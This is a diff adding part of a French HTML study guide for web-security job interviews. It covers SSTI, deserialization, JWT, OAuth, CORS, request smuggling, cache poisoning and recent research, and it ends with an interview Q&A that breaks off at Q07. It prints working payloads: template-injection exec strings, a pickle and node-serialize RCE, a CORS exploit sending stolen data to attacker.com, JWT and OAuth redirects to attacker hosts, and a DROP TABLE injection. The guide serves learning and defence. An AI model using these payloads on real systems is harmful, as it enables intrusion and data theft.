+<span class="cm">## Twig (PHP/Symfony)</span>
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+<span class="cm">## FreeMarker (Java)</span>
+${"freemarker.template.utility.Execute"?new()("id")}
+
+<span class="cm">## Smarty (PHP)</span>
+{system("id")}</pre>
+</section>
+
+<!-- ══════════════════════════════════════
+  13. DESERIALIZATION
+══════════════════════════════════════ -->
+<section class="section" id="deser">
+  <div class="section-header">
+    <span class="section-number">13</span>
+    <h2>Insecure Deserialization</h2>
+    <span class="badge badge-red">CRITIQUE → RCE</span>
+  </div>
+
+  <div class="card card-danger">
+    <p>La désérialisation transforme des données sérialisées (JSON, XML, binaire) en objets. Si un attaquant contrôle les données sérialisées, il peut instancier des objets arbitraires → RCE via des <strong>gadget chains</strong>.</p>
+  </div>
+
+  <h3>Langages & formats concernés</h3>
+  <pre><span class="cm"># Java — sérialisé binaire</span>
+Identifié par: <span class="val">AC ED 00 05</span> (hex) / <span class="val">rO0AB</span> (base64)
+Outils: ysoserial, GadgetProbe, Burp Deserialization Scanner
+Gadget chains: CommonsCollections, Spring, Groovy...
+
+<span class="cm"># PHP — serialize()</span>
+O:4:"User":2:{s:4:"name";s:5:"admin";s:8:"isAdmin";b:1;}
+<span class="cm">→ Modifier isAdmin: b:1 (true)</span>
+Phar deserialization via phar:// wrapper
+
+<span class="cm"># Python — pickle</span>
+<span class="cm"># JAMAIS désérialiser du pickle non vérifié → RCE direct</span>
+import pickle, os
+class RCE: __reduce__ = lambda self: (os.system, ('id',))
+pickle.dumps(RCE())
+
+<span class="cm"># JavaScript Node.js — node-serialize, serialize-javascript</span>
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',...)}"}</pre>
+</section>
+
+<!-- ══════════════════════════════════════
+  14. AUTH & SESSIONS
+══════════════════════════════════════ -->
+<section class="section" id="auth">
+  <div class="section-header">
+    <span class="section-number">14</span>
+    <h2>Authentication &amp; Session Management</h2>
+    <span class="badge badge-high">HIGH</span>
+  </div>
+
+  <h3>Attaques d'authentification courantes</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Attaque</th><th>Description</th><th>Prévention</th></tr>
+    <tr><td>Brute-force</td><td>Essai exhaustif de passwords</td><td>Rate limiting, lockout, CAPTCHA</td></tr>
+    <tr><td>Credential Stuffing</td><td>Combos user:pass leakés</td><td>MFA, détection d'anomalie</td></tr>
+    <tr><td>Password Spraying</td><td>1 password → many users</td><td>Rate limiting par IP et user</td></tr>
+    <tr><td>Username Enumeration</td><td>Réponses différentes si user existe</td><td>Messages d'erreur génériques</td></tr>
+    <tr><td>Reset Token Weak</td><td>Token prévisible ou non expirant</td><td>Random + courte validité + usage unique</td></tr>
+    <tr><td>Session Fixation</td><td>Forcer l'ID de session avant login</td><td>Régénérer l'ID après login</td></tr>
+    <tr><td>Session Hijacking</td><td>Vol de cookie session (XSS, MITM)</td><td>HttpOnly, Secure, rotation</td></tr>
+  </table></div>
+
+  <h3>Host Header Injection → Password Reset Poisoning</h3>
+  <pre><span class="cm"># Si le serveur utilise le Host header pour construire l'URL de reset :</span>
+POST /reset-password
+Host: <span class="danger-text">attacker.com</span>
+email: victim&#64;example.com
+
+<span class="cm"># La victime reçoit un email avec :</span>
+<span class="url">https://attacker.com/reset?token=abc123</span>
+<span class="cm"># → l'attaquant intercepte le token</span></pre>
+</section>
+
+<!-- ══════════════════════════════════════
+  15. JWT ATTACKS
+══════════════════════════════════════ -->
+<section class="section" id="jwt">
+  <div class="section-header">
+    <span class="section-number">15</span>
+    <h2>JWT Attacks</h2>
+    <span class="badge badge-high">HIGH</span>
+  </div>
+
+  <div class="card card-info">
+    <p>JWT = <code>header.payload.signature</code> en base64url. Le serveur vérifie la signature pour s'assurer que le payload n'a pas été modifié.</p>
+  </div>
+
+  <h3>Attaques classiques</h3>
+  <pre><span class="cm">## 1. Algorithm None Attack</span>
+<span class="cm"># Changer alg: HS256 → none, supprimer la signature</span>
+{"alg":"none","typ":"JWT"}
+<span class="cm"># Payload: {"user":"admin"}</span>
+<span class="cm"># Envoyer: eyJ... (header) . eyJ... (payload) . (signature vide)</span>
+
+<span class="cm">## 2. HS256 → RS256 (Algorithm Confusion)</span>
+<span class="cm"># Si le serveur utilise RS256 mais accepte HS256 :</span>
+<span class="cm"># Signer avec la clé PUBLIQUE RSA en tant que secret HMAC</span>
+<span class="cm"># jwt_tool: python3 jwt_tool.py [token] -X k -pk public.pem</span>
+
+<span class="cm">## 3. Weak Secret (Brute Force)</span>
+<span class="cm"># Si HS256 avec secret faible :</span>
+hashcat -a 0 -m 16500 [jwt] /usr/share/wordlists/rockyou.txt
+
+<span class="cm">## 4. JWT Header Injection (kid, jku, x5u)</span>
+<span class="cm"># kid parameter injection → path traversal ou SQL injection</span>
+{"kid": "../../dev/null"}  <span class="cm">→ signer avec string vide</span>
+{"kid": "' UNION SELECT 'attacker-key'--"}
+
+<span class="cm"># jku / x5u → pointer vers un JWK externe contrôlé</span>
+{"jku": "https://attacker.com/jwks.json"}  <span class="cm">→ serveur fetch les clés publiques de l'attaquant</span>
+
+<span class="cm">## 5. Embedded JWK</span>
+<span class="cm"># Insérer sa propre clé publique dans le header jwk</span>
+{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}</pre>
+</section>
+
+<!-- ══════════════════════════════════════
+  16. OAuth / OIDC
+══════════════════════════════════════ -->
+<section class="section" id="oauth">
+  <div class="section-header">
+    <span class="section-number">16</span>
+    <h2>OAuth 2.0 &amp; OIDC Security</h2>
+    <span class="badge badge-high">HIGH</span>
+  </div>
+
+  <h3>Flows OAuth 2.0</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Flow</th><th>Usage</th><th>Risque</th></tr>
+    <tr><td>Authorization Code</td><td>Web apps (recommandé)</td><td>Open redirect, CSRF sur callback</td></tr>
+    <tr><td>Authorization Code + PKCE</td><td>Mobile/SPA (best practice)</td><td>Plus sécurisé</td></tr>
+    <tr><td>Implicit (déprécié)</td><td>SPA (ancien)</td><td>Token dans URL → logs, Referer</td></tr>
+    <tr><td>Client Credentials</td><td>M2M (machine-to-machine)</td><td>Secret leak</td></tr>
+    <tr><td>Resource Owner Password</td><td>Déprécié</td><td>Exposition des credentials</td></tr>
+  </table></div>
+
+  <h3>Attaques OAuth courantes</h3>
+  <pre><span class="cm">## 1. Open Redirect → Account Takeover</span>
+<span class="cm"># redirect_uri non validée strictement</span>
+/oauth/authorize?client_id=app&redirect_uri=https://evil.com&...
+<span class="cm"># Variations bypass whitelist :</span>
+https://trusted.com.evil.com/callback    <span class="cm">(subdomain)</span>
+https://trusted.com/callback&#64;evil.com   <span class="cm">(@ ambiguité)</span>
+https://trusted.com/callback#evil.com   <span class="cm">(fragment)</span>
+https://trusted.com/../redirect?evil.com <span class="cm">(path traversal)</span>
+
+<span class="cm">## 2. CSRF sur OAuth callback</span>
+<span class="cm"># state parameter absent ou non validé</span>
+<span class="cm"># → forcer l'association d'un compte OAuth attaquant</span>
+
+<span class="cm">## 3. Authorization Code Interception</span>
+<span class="cm"># Redirect vers page contrôlée, récupérer ?code= dans le Referer</span>
+
+<span class="cm">## 4. Scope Escalation</span>
+<span class="cm"># Modifier scope=read → scope=admin si non validé</span>
+
+<span class="cm">## 5. Flawed Token Validation</span>
+<span class="cm"># Utiliser un access_token d'une autre app (même provider)</span></pre>
+</section>
+
+<!-- ══════════════════════════════════════
+  17. CORS / CSP
+══════════════════════════════════════ -->
+<section class="section" id="cors">
+  <div class="section-header">
+    <span class="section-number">17</span>
+    <h2>CORS Misconfiguration &amp; CSP Bypass</h2>
+    <span class="badge badge-high">HIGH</span>
+  </div>
+
+  <h3>Exploitation CORS misconfiguration</h3>
+  <pre><span class="cm"># Test : envoyer Origin: https://evil.com et voir si reflété dans Access-Control-Allow-Origin</span>
+
+<span class="cm"># Exploit si ACAO: evil.com + ACAC: true</span>
+fetch('https://vulnerable.com/api/sensitive', {credentials: 'include'})
+  .then(r =&gt; r.text())
+  .then(data =&gt; fetch('https://attacker.com/steal?d=' + btoa(data)));
+
+<span class="cm"># null origin exploit (iframe sandboxé)</span>
+&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms"
+  src="data:text/html,&lt;script&gt;fetch('https://vuln.com/api',{credentials:'include'})...&lt;/script&gt;"&gt;
+&lt;/iframe&gt;</pre>
+</section>
+
+<!-- ══════════════════════════════════════
+  18. HTTP REQUEST SMUGGLING
+══════════════════════════════════════ -->
+<section class="section" id="smuggling">
+  <div class="section-header">
+    <span class="section-number">18</span>
+    <h2>HTTP Request Smuggling</h2>
+    <span class="badge badge-high">HIGH</span>
+  </div>
+
+  <div class="card card-danger">
+    <p>Exploite des divergences dans la façon dont le front-end (proxy/CDN) et le back-end interprètent la frontière entre requêtes HTTP, permettant de "faire passer en contrebande" une partie d'une requête comme le début d'une autre.</p>
+  </div>
+
+  <h3>Variantes</h3>
+  <pre><span class="cm">## CL.TE — Front-end croit Content-Length, Back-end croit Transfer-Encoding</span>
+POST / HTTP/1.1
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+
+<span class="cm">## TE.CL — Front-end croit TE, Back-end croit CL</span>
+POST / HTTP/1.1
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+
+<span class="cm">## TE.TE — Les deux interprètent TE, mais l'un peut être ambigu</span>
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked    <span class="cm">(espace avant :)</span>
+Transfer-Encoding: chunked
+Transfer-Encoding: x          <span class="cm">(double header)</span></pre>
+
+  <h3>Impact</h3>
+  <ul>
+    <li>Bypass de sécurité front-end (WAF, auth)</li>
+    <li>Capturer les requêtes d'autres utilisateurs (vol de sessions, credentials)</li>
+    <li>Accès à des endpoints internes</li>
+    <li>Réflexion XSS qui contourne CSP</li>
+    <li>Web cache poisoning via smuggling</li>
+  </ul>
+</section>
+
+<!-- ══════════════════════════════════════
+  19. CACHE POISONING
+══════════════════════════════════════ -->
+<section class="section" id="cache">
+  <div class="section-header">
+    <span class="section-number">19</span>
+    <h2>Web Cache Poisoning</h2>
+    <span class="badge badge-high">HIGH</span>
+  </div>
+
+  <div class="card card-warn">
+    <p>Empoisonner le cache d'un CDN/proxy avec une réponse malveillante, servie ensuite à tous les utilisateurs de la ressource.</p>
+  </div>
+
+  <pre><span class="cm"># Principe : trouver un "unkeyed input" (pas dans la cache key mais reflété dans la réponse)</span>
+
+<span class="cm"># Exemple : X-Forwarded-Host reflété dans des liens de la page</span>
+GET / HTTP/1.1
+Host: example.com
+X-Forwarded-Host: <span class="danger-text">evil.com</span>
+
+<span class="cm"># Si la réponse contient : &lt;script src="//evil.com/app.js"&gt;</span>
+<span class="cm"># Et est mise en cache → tous les visiteurs chargent le JS de l'attaquant</span>
+
+<span class="cm"># Autres headers unkeyed courants :</span>
+X-Host, X-Forwarded-Server, X-Original-URL, X-Rewrite-URL
+Vary: (défini mais non implémenté comme cache key)</pre>
+</section>
+
+<!-- ══════════════════════════════════════
+  20. API SECURITY
+══════════════════════════════════════ -->
+<section class="section" id="api">
+  <div class="section-header">
+    <span class="section-number">20</span>
+    <h2>API Security</h2>
+    <span class="badge badge-high">HIGH</span>
+  </div>
+
+  <h3>OWASP API Top 10 (2023)</h3>
+  <div class="table-wrap"><table>
+    <tr><th>#</th><th>Vulnérabilité</th><th>Description courte</th></tr>
+    <tr><td>API1</td><td>Broken Object Level Authorization</td><td>IDOR sur les objets</td></tr>
+    <tr><td>API2</td><td>Broken Authentication</td><td>Tokens faibles, mauvaise gestion</td></tr>
+    <tr><td>API3</td><td>Broken Object Property Level Auth</td><td>Accès à des propriétés non autorisées</td></tr>
+    <tr><td>API4</td><td>Unrestricted Resource Consumption</td><td>No rate limit, DoS possible</td></tr>
+    <tr><td>API5</td><td>Broken Function Level Auth</td><td>Endpoints admin accessibles</td></tr>
+    <tr><td>API6</td><td>Unrestricted Access to Sensitive Flows</td><td>Pas de limite sur flows sensibles</td></tr>
+    <tr><td>API7</td><td>Server-Side Request Forgery</td><td>SSRF via API</td></tr>
+    <tr><td>API8</td><td>Security Misconfiguration</td><td>CORS, debug, verbose errors</td></tr>
+    <tr><td>API9</td><td>Improper Inventory Management</td><td>Endpoints non documentés, versions legacy</td></tr>
+    <tr><td>API10</td><td>Unsafe Consumption of APIs</td><td>Trust implicite des APIs tierces</td></tr>
+  </table></div>
+
+  <h3>GraphQL Security</h3>
+  <pre><span class="cm"># Introspection (souvent laissée active en production)</span>
+{"query": "{__schema{types{name}}}"}
+{"query": "{__type(name:\"User\"){fields{name}}}"}
+
+<span class="cm"># Batch Queries → brute-force en 1 requête</span>
+[{"query": "{ login(user:'admin', pass:'password1') }"},
+ {"query": "{ login(user:'admin', pass:'password2') }"}]
+
+<span class="cm"># Alias pour contourner rate limit</span>
+{ q1: user(id:1){email} q2: user(id:2){email} q3: user(id:3){email} }
+
+<span class="cm"># Injections dans les mutations GraphQL</span>
+mutation { createUser(name: "'; DROP TABLE users;--") }</pre>
+</section>
+
+<!-- ══════════════════════════════════════
+  21. CLICKJACKING
+══════════════════════════════════════ -->
+<section class="section" id="clickjacking">
+  <div class="section-header">
+    <span class="section-number">21</span>
+    <h2>Clickjacking</h2>
+    <span class="badge badge-medium">MEDIUM</span>
+  </div>
+
+  <pre><span class="cm"># L'attaquant embed la page cible dans un iframe transparent au-dessus d'un leurre</span>
+&lt;style&gt;
+  iframe { opacity: 0.01; position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
+  #lure { position: absolute; top: 300px; left: 200px; }
+&lt;/style&gt;
+&lt;div id="lure"&gt;WIN A PRIZE! CLICK HERE&lt;/div&gt;
+&lt;iframe src="https://victim.com/settings/delete-account"&gt;&lt;/iframe&gt;
+
+<span class="cm"># Défenses</span>
+X-Frame-Options: DENY              <span class="cm">← plus simple</span>
+X-Frame-Options: SAMEORIGIN
+Content-Security-Policy: frame-ancestors 'none'  <span class="cm">← plus flexible, moderne</span></pre>
+</section>
+
+<hr class="divider">
+
+<!-- ══════════════════════════════════════
+  PORTSWIGGER RESEARCH 2025
+══════════════════════════════════════ -->
+<section class="section" id="psresearch">
+  <div class="section-header">
+    <span class="section-number">PS</span>
+    <h2>PortSwigger Research — Hot Topics 2025</h2>
+    <span class="badge badge-red">VEILLE — IMPRESSIONNE L'INTERVIEWER</span>
+  </div>
+
+  <div class="alert alert-info">
+    <span class="alert-icon">🔬</span>
+    <div>Citer des recherches récentes de PortSwigger en entretien est un excellent signal de veille active. Voici les techniques les plus importantes à connaître issues du <strong>Top 10 Web Hacking Techniques of 2025</strong> et des recherches récentes.</div>
+  </div>
+
+  <!-- #1 SSTI Error-based -->
+  <h3>🥇 #1 — Successful Errors : New SSTI & Code Injection Techniques</h3>
+  <div class="card card-danger">
+    <p><strong>Chercheur :</strong> Vladislav Korchagin — <strong>Source :</strong> <a href="https://portswigger.net/research/top-10-web-hacking-techniques-of-2025" style="color:var(--accent)">PortSwigger Top 10 WHT 2025</a></p>
+    <p>Nouvelles techniques basées sur les erreurs pour exploiter le <strong>Server-Side Template Injection aveugle</strong>. Introduction de polyglots de détection et intégration dans un toolkit open-source. Adapte les techniques SQL injection error-based au SSTI.</p>
+  </div>
+  <pre><span class="cm"># Blind SSTI — avant ces recherches, très difficile à détecter automatiquement</span>
+<span class="cm"># Nouvelle approche : provoquer des erreurs différentes selon le moteur</span>
+<span class="cm"># → error-based SSTI comme error-based SQLi</span>
+
+<span class="cm"># Polyglot de détection multi-moteurs (concept)</span>
+${"z"*9000}{{9*9}}   <span class="cm">→ observe quel moteur crash/répond</span>
+{{9/0}}              <span class="cm">→ division par zéro → message d'erreur révèle le moteur</span>
+
+<span class="cm"># Point clé pour l'entretien : le SSTI aveugle est maintenant exploitable</span>
+<span class="cm"># sans affichage de la sortie, en utilisant les messages d'erreur comme oracle</span></pre>
+
+  <!-- #2 ORM Leaks -->
+  <h3>🥈 #2 — ORM Leaks : Leaking More Than You Joined For</h3>
+  <div class="card card-warn">
+    <p><strong>Chercheur :</strong> Alex Brown (elttam) — <strong>Source :</strong> <a href="https://www.elttam.com/blog/leaking-more-than-you-joined-for/" style="color:var(--accent)">elttam.com</a></p>
+    <p>Évolution des ORM leaks en méthodologie générique. Les fonctionnalités de <strong>recherche et filtrage</strong> dans les APIs REST/GraphQL peuvent exposer des données non autorisées via les opérateurs de l'ORM, sans injection SQL classique.</p>
+  </div>
+  <pre><span class="cm"># Concept : les ORMs exposent souvent des opérateurs de filtrage puissants</span>
+<span class="cm"># Ex: Django, Rails, Prisma, Sequelize</span>
+
+<span class="cm"># API vulnérable (Prisma/Django style)</span>
+GET /api/users?email[contains]=admin    <span class="cm">→ filtre par sous-chaîne</span>
+GET /api/users?salary[gt]=100000        <span class="cm">→ fuite de données sensibles</span>
+GET /api/orders?user[email][endsWith]&#64;admin.com  <span class="cm">→ enum des emails internes</span>
+
+<span class="cm"># Différence avec SQLi : pas d'injection de code, utilisation légitime</span>
+<span class="cm"># de l'API de l'ORM → contourne les WAFs</span>
+<span class="cm"># Impact : dump complet de la DB via filtres successifs</span></pre>
+
+  <!-- #3 SSRF Redirect Loops -->
+  <h3>🥉 #3 — Novel SSRF Technique via HTTP Redirect Loops</h3>
+  <div class="card card-danger">
+    <p><strong>Chercheur :</strong> @shubs (Shubham Shah) — <strong>Source :</strong> <a href="https://slcyber.io/research-center/novel-ssrf-technique-involving-http-redirect-loops/" style="color:var(--accent)">slcyber.io</a></p>
+    <p>Technique pour <strong>rendre un SSRF aveugle visible</strong> en utilisant des boucles de redirections HTTP. Permet de confirmer et exploiter des SSRF précédemment considérés comme "blind".</p>
+  </div>
+  <pre><span class="cm"># Le problème du SSRF blind : pas de réponse visible</span>
+<span class="cm"># La technique : créer une boucle de redirection qui cause un comportement observable</span>
+
+<span class="cm"># Serveur attaquant → redirige en boucle vers lui-même</span>
+http://attacker.com/redirect → 301 → http://attacker.com/redirect (loop)
+
+<span class="cm"># Le serveur vulnérable suit les redirections jusqu'à un timeout</span>
+<span class="cm"># → délai observable dans la réponse = confirmation SSRF (time-based)</span>
+<span class="cm"># → les logs du serveur attaquant révèlent les headers internes, IP source, etc.</span>
+
+<span class="cm"># Très utile pour transformer "potentiellement vulnérable" en "confirmé exploitable"</span></pre>
+
+  <!-- XS-Leaks -->
+  <h3>Side-Channels & XS-Leaks (tendance 2025)</h3>
+  <div class="card card-info">
+    <p>Selon James Kettle : <em>"2025 saw the rise of side-channels as a core exploitation primitive."</em> Deux techniques dans le top 10 :</p>
+  </div>
+  <div class="grid-2">
+    <div class="card card-warn">
+      <h4>#8 — XSS-Leak: Cross-Origin Redirect Leak</h4>
+      <p>Utilise l'algorithme de priorisation du <strong>connection-pool de Chrome</strong> comme oracle pour deviner le hostname de destination d'une redirection cross-domain, sans lire la réponse.</p>
+      <p><em>Impact : info disclosure cross-origin sans XSS</em></p>
+    </div>
+    <div class="card card-warn">
+      <h4>#6 — Cross-Site ETag Length Leak</h4>
+      <p>Exploite les headers <code>ETag</code> pour révéler la <strong>taille de la réponse cross-domain</strong>. Découvert comme solution non prévue d'un CTF. Chaîne de plusieurs edge-cases pour un impact plus large.</p>
+    </div>
+  </div>
+
+  <!-- Unicode Normalization -->
+  <h3>#4 — Lost in Translation : Unicode Normalization Attacks</h3>
+  <div class="card card-warn">
+    <p><strong>Chercheurs :</strong> Ryan & Isabella Barnett — <strong>Source :</strong> Black Hat / ActiveScan++</p>
+    <p>Exploitation des <strong>normalisations Unicode</strong> pour bypasser des contrôles d'accès, des filtres et des WAFs. Un caractère Unicode peut être normalisé en une séquence ASCII avec des implications de sécurité.</p>
+  </div>
+  <pre><span class="cm"># Exemples de normalisations dangereuses</span>
+<span class="cm">ℌ → H   (U+210C Fraktur H → ASCII H)</span>
+<span class="cm">﹤ → <   (U+FE64 small less-than → ASCII &lt;, bypass filtre XSS)</span>
+<span class="cm">① → 1   (U+2460 circled digit one)</span>
+<span class="cm">ＡＤＭＩＮadmin → après NFKC normalisation → devient "ADMINadmin"</span>
+
+<span class="cm"># Bypass access control : /ＡＤＭＩＮ → normalisé → /ADMIN</span>
+<span class="cm"># Si le check est fait avant la normalisation mais le routing après</span>
+<span class="cm"># → accès à des endpoints protégés</span>
+
+<span class="cm"># Bypass SQLi filter : ＵＮＩＯＮuni → UNION après normalisation</span>
+<span class="cm"># Intégré dans ActiveScan++ pour Burp</span></pre>
+
+  <!-- Next.js cache -->
+  <h3>#7 — Next.js Internal Cache Poisoning</h3>
+  <div class="card card-info">
+    <p><strong>Chercheur :</strong> Rachid Allam (zhero) — <strong>Source :</strong> <a href="https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir" style="color:var(--accent)">zhero-web-sec.github.io</a></p>
+    <p>Vulnérabilité <strong>critique dans le cœur de Next.js</strong> — cache interne poisonnable. Différent du web cache poisoning classique (CDN/proxy) car il s'agit du cache applicatif interne du framework. Montre l'importance d'analyser le code source des frameworks populaires.</p>
+  </div>
+
+  <!-- SAML Fragile Lock -->
+  <h3>The Fragile Lock — Novel SAML Authentication Bypasses (Déc. 2025)</h3>
+  <div class="card card-danger">
+    <p><strong>Chercheur :</strong> Zakhar Fedotkin (PortSwigger) — <strong>Source :</strong> <a href="https://portswigger.net/research/the-fragile-lock" style="color:var(--accent)">portswigger.net/research/the-fragile-lock</a></p>
+    <p>Bypasses complets d'authentification SAML dans les écosystèmes Ruby et PHP via des incohérences de parsers XML. Affecte GitLab EE ≤ 17.8.4 et d'autres.</p>
+  </div>
+  <pre><span class="cm"># SAML = XML signé → sécurité dépend de la validation de signature XML</span>
+<span class="cm"># Problème : validation et parsing faits par 2 parsers différents (REXML + Nokogiri)</span>
+
+<span class="cm">## Techniques exploitées :</span>
+<span class="cm">1. Attribute Pollution : ID="attack" samlp:ID="real" → chaque parser lit un attribut différent</span>
+<span class="cm">2. Namespace Confusion : xml:xmlns redéfini → cache l'élément Signature à un parser</span>
+<span class="cm">3. Void Canonicalization (NOUVEAU) : URI relative xmlns:ns="1" cause une erreur de</span>
+<span class="cm">   canonicalization dans Nokogiri → retourne string vide → DigestValue = hash("")</span>
+<span class="cm">   → attaquant peut forger n'importe quelle assertion avec signature valide</span>
+
+<span class="cm"># "Golden SAML Response" : réponse qui passe TOUJOURS la validation</span>
+<span class="cm"># peu importe les claims forgés → account takeover complet</span>
+
+<span class="cm"># Fix : une seule implémentation XML, strict schema sans extensions,</span>
+<span class="cm">       ne jamais faire confiance à l'email domain seul pour l'access control</span></pre>
+
+  <!-- Parser Differentials -->
+  <h3>#10 — Parser Differentials</h3>
+  <div class="card card-info">
+    <p>Concept transversal : quand deux composants (proxy/backend, validation/parser, etc.) interprètent la même donnée différemment → surface d'attaque. S'applique à XML, URL, HTTP, JSON, MIME types. Le SAML Fragile Lock en est un exemple parfait.</p>
+  </div>
+  <pre><span class="cm"># Exemples de parser differentials exploités en 2025</span>
+<span class="cm">URL parsing  : urllib vs requests → host différent dans la même URL</span>
+<span class="cm">HTTP parsing : Content-Length vs Transfer-Encoding → Request Smuggling</span>
+<span class="cm">XML parsing  : REXML vs Nokogiri → SAML bypass</span>
+<span class="cm">JSON parsing : trailing comma acceptée par un parser, rejetée par l'autre</span>
+<span class="cm">Email parsing: "user"@domain → splitting the email atom (Gareth Heyes 2024)</span></pre>
+
+  <h3>Ressources PortSwigger à connaître</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Chercheur</th><th>Handle</th><th>Spécialité</th></tr>
+    <tr><td>James Kettle</td><td>@albinowax</td><td>HTTP Smuggling, Cache Poisoning, SSRF, Web Cache Deception</td></tr>
+    <tr><td>Gareth Heyes</td><td>@garethheyes</td><td>XSS, CSP bypass, SAML, JS gadgets, Template Injection</td></tr>
+    <tr><td>Zakhar Fedotkin</td><td>@zakfedotkin</td><td>SAML, XML Security, Parser Differentials</td></tr>
+  </table></div>
+</section>
+<section class="section" id="questions">
+  <div class="section-header">
+    <span class="section-number">Q&A</span>
+    <h2>Questions Techniques — Entraînement</h2>
+    <span class="badge badge-red">PRATIQUE</span>
+  </div>
+
+  <div class="alert alert-info">
+    <span class="alert-icon">🎯</span>
+    <div>Clique sur chaque question pour voir la réponse. Essaie de répondre avant de regarder !</div>
+  </div>
+
+  <div class="qa-container">
+
+    <!-- HTTP -->
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q01</span><span class="qa-q-text">Quelle est la différence entre une erreur 401 et une erreur 403 ?</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer"><strong>401 Unauthorized</strong> signifie que le client n'est pas authentifié — il n'a pas fourni de credentials ou ils sont invalides. La réponse inclut généralement un header <code>WWW-Authenticate</code> indiquant comment s'authentifier. <strong>403 Forbidden</strong> signifie que le client est identifié (ou même authentifié) mais n'a pas les permissions pour accéder à la ressource. <em>En pentest</em> : un 403 peut être bypassé via des techniques comme la modification de méthodes HTTP, des headers X-Original-URL, ou des variations de path case. Un 401 nécessite de trouver ou bruteforcer des credentials.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q02</span><span class="qa-q-text">Explique le Same-Origin Policy et ses limitations en sécurité.</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer">La <strong>SOP</strong> empêche un script d'une origine (schéma+host+port) de lire les réponses d'une autre origine. Elle protège contre le vol de données cross-origin. <em>Limitations :</em> Elle n'empêche pas les requêtes cross-origin (elle empêche la lecture des réponses, d'où CSRF). Elle n'empêche pas l'embedding (images, scripts, CSS), d'où le clickjacking. Elle ne couvre pas les WebSockets sans CORS. Les cookies SameSite=None contournent sa protection pour les cookies. Des mises en œuvre incorrectes de CORS la court-circuitent entièrement.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q03</span><span class="qa-q-text">Quelles sont les 3 types de XSS ? Lequel est le plus dangereux et pourquoi ?</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer"><strong>Reflected XSS :</strong> payload dans la requête, reflété immédiatement. Nécessite un lien malveillant. <strong>Stored XSS :</strong> stocké en base de données, exécuté pour tous les visiteurs. <strong>DOM-based XSS :</strong> le payload ne passe jamais par le serveur, traité entièrement côté client. <em>Le plus dangereux</em> est le <strong>Stored XSS</strong> car il ne nécessite aucune interaction victim→lien, touche tous les utilisateurs, persiste dans le temps, et peut viser des admins. Cependant, le DOM XSS est souvent le plus difficile à détecter car les scanners serveur ne le voient pas.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q04</span><span class="qa-q-text">Comment fonctionne une attaque SSRF sur le service de métadonnées AWS ? Qu'est-ce qu'IMDSv2 apporte ?</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer">En <strong>IMDSv1</strong>, n'importe quelle requête HTTP vers <code>169.254.169.254</code> renvoie les métadonnées de l'instance, y compris les credentials IAM temporaires. En SSRF, l'attaquant force le serveur à requêter cette URL et récupère les clés d'accès AWS via la réponse. <strong>IMDSv2</strong> requiert d'abord un PUT pour obtenir un token (TTL court), puis inclure ce token dans un header custom. Cela empêche le SSRF simple car les requêtes SSRF classiques ne font qu'un GET (pas de PUT préalable). <em>Bypass partiel :</em> si l'application permet des requêtes arbitraires avec headers custom, IMDSv2 peut être contourné.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q05</span><span class="qa-q-text">Qu'est-ce que le HTTP Request Smuggling ? Explique la variante CL.TE.</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer">Le <strong>Request Smuggling</strong> exploite des divergences d'interprétation entre le proxy front-end et le serveur back-end sur la longueur des requêtes HTTP. Dans <strong>CL.TE</strong> : le front-end utilise <code>Content-Length</code> pour définir la fin de la requête, le back-end utilise <code>Transfer-Encoding: chunked</code>. L'attaquant envoie les deux headers. Le front-end voit CL et transmet tout. Le back-end voit TE, lit jusqu'au chunk "0" (fin), et considère le reste ("SMUGGLED") comme le début d'une nouvelle requête. Ce "début" sera préfixé à la prochaine requête d'un autre utilisateur, permettant de modifier sa requête, capturer ses données, ou bypass des contrôles d'accès.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q06</span><span class="qa-q-text">Quels sont les différents attributs de cookies sécurité et leur rôle exact ?</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer"><strong>HttpOnly :</strong> bloque l'accès JavaScript (document.cookie), protège contre le vol via XSS. <strong>Secure :</strong> cookie envoyé uniquement sur HTTPS, protège contre l'interception MITM. <strong>SameSite=Strict :</strong> cookie jamais envoyé dans les requêtes cross-site (même navigation depuis lien externe) → protection maximale CSRF. <strong>SameSite=Lax :</strong> envoyé pour la navigation de premier niveau (clic sur lien) mais pas pour les sous-requêtes cross-site (images, iframes, fetch). Compromis UX/sécurité. <strong>SameSite=None :</strong> toujours envoyé cross-site, doit être accompagné de Secure. <strong>Domain :</strong> définit les sous-domaines qui reçoivent le cookie. <strong>Path :</strong> limite le cookie à un chemin. <strong>Max-Age/Expires :</strong> persistance.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q07</span><span class="qa-q-text">Comment exploites-tu un SSRF blind si tu n'obtiens aucune réponse du serveur ?</span><span class="qa-chevron">▼</span></div>
